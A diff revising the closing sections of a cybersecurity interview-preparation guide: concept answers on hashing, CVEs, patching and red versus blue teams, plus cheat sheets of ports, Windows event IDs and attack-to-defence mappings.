-**Q145. Where do you see yourself in 3 years within cybersecurity?**
+**95. What would you check if a web application suddenly started responding very slowly or returning errors?**
 
-Good answers show direction without being rigidly fixed — and connect to the role you're interviewing for.
+Investigate from multiple angles:
 
-> **Example:** "In the near term I want to build strong foundational skills in SOC operations and incident response — understanding threats from the defence side. In 2-3 years I'd like to pursue an offensive certification like OSCP to understand attacker techniques more deeply, which will make me a better defender. Long-term, I'm interested in specialising in threat intelligence and detection engineering."
+1. **Is it just slow or down?** Check monitoring dashboards and status pages
+2. **Is it a DDoS?** Check inbound traffic volume — massive spike = possible DDoS
+3. **Is it a resource issue?** Check CPU, memory, disk on the server — could be malware consuming resources or a non-security issue
+4. **Check web server logs** — unusual spike in requests, scanning patterns, large numbers of 4xx/5xx errors
+5. **Check WAF logs** — is it blocking a lot of attack traffic?
+6. **Check for recently deployed changes** — was there a deployment that broke something?
+7. **Check database** — slow queries, connection exhaustion?
 
 ---
 
-## QUICK REFERENCE: EXAM-CRITICAL FACTS
+## SECTION 9: FINAL IMPORTANT CONCEPTS
 
-### Ports You Must Know Cold
+---
+
+**96. What is the difference between encoding, encryption, and hashing?**
+
+Three completely different operations that look similar on the surface:
+
+- **Encoding** — Transforms data into a different format for compatibility, NOT for security. Anyone can reverse it — it provides zero protection. (Base64, URL encoding)
+- **Encryption** — Transforms data to protect its confidentiality. Reversible only with the correct key.
+- **Hashing** — One-way transformation. Cannot be reversed. Used to verify integrity.
+
+> *Common mistake:* Base64 is NOT encryption. Seeing base64-encoded data does not mean it's secure — anyone can decode it instantly.
+
+---
+
+**97. What is a CVE and CVSS?**
+
+- **CVE (Common Vulnerabilities and Exposures)** — A standardised ID assigned to a publicly known vulnerability. Example: CVE-2021-44228 (Log4Shell). Gives everyone a common name to refer to a specific vulnerability.
+- **CVSS (Common Vulnerability Scoring System)** — A 0–10 numerical score reflecting the severity of a vulnerability. Critical ≥ 9.0, High 7.0–8.9, Medium 4.0–6.9, Low < 4.0.
+
+> *Practical use:* When a new CVE is published, the CVSS score helps prioritise patching. Not all vulnerabilities are equally urgent.
+
+---
+
+**98. What is patch management and why is it important?**
+
+Patch management is the systematic process of identifying, acquiring, testing, and deploying software updates (patches) that fix vulnerabilities and bugs.
+
+> *Why it matters:* The majority of successful attacks exploit known vulnerabilities that had patches available. WannaCry exploited a vulnerability (EternalBlue) that Microsoft had patched two months before the outbreak — organisations that hadn't patched were devastated.
+
+**Best practice:** Patch critical and high CVSSs within 24–72 hours. High within 7 days. Medium within 30 days. Have a tested rollback process.
+
+---
+
+**99. What is the difference between a red team and a blue team?**
+
+- **Red Team** — Offensive. Simulates real-world attackers to test the organisation's defences. Uses the same tools and techniques real attackers would use.
+- **Blue Team** — Defensive. Monitors, detects, and responds to attacks — including the red team's simulated attacks.
+- **Purple Team** — Red and blue working together collaboratively in real-time — red team shows attack technique, blue team immediately works on detection/response for it.
+
+> *Why this matters for entry-level:* Most entry-level roles are blue team. Understanding both sides makes you better at each.
+
+---
+
+**100. Why do you want to work in cybersecurity?**
+
+This is always the closing question. Interviewers aren't looking for a rehearsed speech — they're looking for genuine motivation, because the field is demanding and people without real interest burn out quickly.
+
+**What makes a strong answer:**
+- A specific moment or experience that sparked your interest
+- Curiosity about how things work — and how they break
+- The challenge and variety of the work
+- The real-world impact of protecting people and organisations
+
+**What to avoid:** "I heard it pays well" (even if partly true). "I like computers." Generic answers with no specific connection to security.
+
+> *The honest truth an interviewer is listening for:* Do you talk about security the way someone who is genuinely interested talks? Do your eyes light up when you describe an attack or a concept? That enthusiasm — not just knowledge — is what makes someone want to hire you.
+
+---
+
+## QUICK-REFERENCE CHEAT SHEET
+
+### Ports — Know These Cold
 ```
-22=SSH  23=Telnet  25=SMTP  53=DNS  80=HTTP  443=HTTPS
-445=SMB  3389=RDP  389=LDAP  636=LDAPS  1433=MSSQL  3306=MySQL
+22   SSH          (secure remote access)
+23   Telnet       (insecure — plaintext)
+25   SMTP         (email sending)
+53   DNS          (name resolution — UDP/TCP)
+80   HTTP         (unencrypted web)
+443  HTTPS        (encrypted web)
+445  SMB          (Windows file sharing — high risk)
+3389 RDP          (Windows remote desktop — high risk)
+389  LDAP         (directory — plaintext)
+636  LDAPS        (directory — encrypted)
 ```
 
-### Event IDs You Must Know Cold
+### The CIA Triad Applied to Attacks
 ```
-4624=Login success   4625=Login failure   4648=Explicit credential use
-4672=Special privileges  4688=Process created  4698=Scheduled task created
-4697=Service installed   4720=Account created  4728/32/56=Group membership added
-1102=Log cleared (CRITICAL)  7045=Service installed (System log)
-4769=Kerberos TGT-SVC requested (Kerberoasting)
+Ransomware      → All three (C + I + A)
+Data theft      → Confidentiality
+Log tampering   → Integrity
+DDoS            → Availability
+Password crack  → Confidentiality
 ```
 
 ### Attack → Defence Quick Map
 ```
-ARP Spoofing      → Dynamic ARP Inspection (DAI), 802.1X
-LLMNR Poisoning   → Disable LLMNR/NetBIOS via GPO
-NTLM Relay        → Enable SMB Signing
-Kerberoasting     → gMSA (Managed Service Accounts)
-Pass-the-Hash     → Credential Guard, disable NTLM
-Brute Force       → Account lockout, MFA, rate limiting
-Phishing          → DMARC/DKIM/SPF, user training, email filtering
-SQL Injection     → Parameterised queries
-XSS               → Output encoding, CSP headers
-Rainbow Tables    → Salting + bcrypt/Argon2
+Phishing         → DMARC/DKIM/SPF + user training + MFA
+Brute force      → Account lockout + MFA + rate limiting
+SQL Injection    → Parameterised queries
+XSS              → Output encoding + CSP headers
+ARP Spoofing     → Dynamic ARP Inspection (DAI)
+MITM             → TLS/HTTPS + certificate validation
+Ransomware       → Offline backups + EDR + segmentation
+Social Eng.      → User training + verification processes
+DDoS             → Rate limiting + CDN + scrubbing
 ```
 
-### Hash Algorithm Decision Guide
+### Event IDs — Essential for SOC Roles
 ```
-Password storage:    Argon2 > bcrypt > scrypt  (slow = good)
-File integrity:      SHA-256 or SHA-3          (fast = good)
-Digital signatures:  SHA-256 with RSA/ECDSA
-AVOID:               MD5, SHA-1 for any security purpose
+4624  Successful login
+4625  Failed login
+4648  Explicit credential use  (lateral movement)
+4672  Admin privileges at login
+4688  Process created           (watch parent-child)
+4698  Scheduled task created    (persistence)
+4720  User account created      (backdoor?)
+1102  Security log CLEARED      (⚠ critical alert)
+7045  Service installed          (persistence)
 ```
 
-### OSI Layer → Attack → Tool Map
+### Hashing — Know What to Use
 ```
-L2: ARP Spoofing → Ettercap, arpspoof
-L3: IP Spoofing, routing → Hping3
-L4: SYN Flood → hping3, scapy
-L7: SQLi, XSS, CSRF → SQLmap, Burp Suite
+Passwords:       bcrypt / Argon2 / scrypt  (slow = good)
+File integrity:  SHA-256                   (fast = good)
+Avoid:           MD5, SHA-1                (broken)
 ```
 
 ---
 
-*End of Guide — 200 Questions*
+*100 questions. No fluff. Everything here comes up.*
 
 ---
 
-> **Final advice:** When you don't know an answer, don't fabricate. Say: "I haven't worked with that specific technology directly, but based on my understanding of [related concept], I would expect it to work by..." Intellectual honesty combined with reasoning capability is far more impressive than a confident wrong answer — and far more reflective of how real security work happens.
-
-> **Good luck with your interview at the Azerbaijani Cybersecurity Center.** The fact that you're preparing this thoroughly already puts you ahead of most candidates who walk in relying on what they half-remember.
+> **One last thing:** The best candidates I've hired over 20 years weren't the ones who knew the most facts. They were the ones who could think clearly under pressure, admit what they didn't know, and reason their way to a sensible answer. Walk into that interview calm, be honest, and think out loud. That's what gets you hired.
+>
+> **Good luck.**
